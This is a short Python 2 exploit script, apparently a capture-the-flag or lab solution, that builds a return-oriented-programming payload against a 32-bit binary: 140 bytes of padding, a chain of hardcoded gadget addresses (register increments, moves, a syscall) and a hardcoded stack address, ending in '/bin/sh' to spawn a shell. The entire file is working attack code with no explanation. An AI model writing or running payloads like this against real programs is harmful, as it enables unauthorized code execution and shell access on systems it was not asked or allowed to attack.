#! /usr/bin/env python

PATTERN = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQA'
# 0xbffff808
SHELL_ADDR = '\x28\xf8\xff\xbf' 


# 0x0808fd50
eax_plus_3 = "\x50\xfd\x08\x08"

# 0x0808fd37
eax_plus_2 = "\x37\xfd\x08\x08"

# 0x08049401
syscall = '\x01\x94\x04\x08'

# 0x080db4d1
inc_ebx = '\xd1\xb4\x0d\x08'

# 0x080b5b64
mov_edx_f_jjj = '\x64\x5b\x0b\x08'

# 0x0805d3c7
inc_edx = '\xc7\xd3\x05\x08'

# 0x080498f3
mov_ecx_eax_ebxjjj = '\xf3\x98\x04\x08'

print 'A' * 140 + mov_ecx_eax_ebxjjj + SHELL_ADDR + 'JUNK' * 3 + mov_edx_f_jjj + 'JUNK' * 3 + inc_edx + eax_plus_3 * 3 + eax_plus_2 + syscall + '/bin/sh'
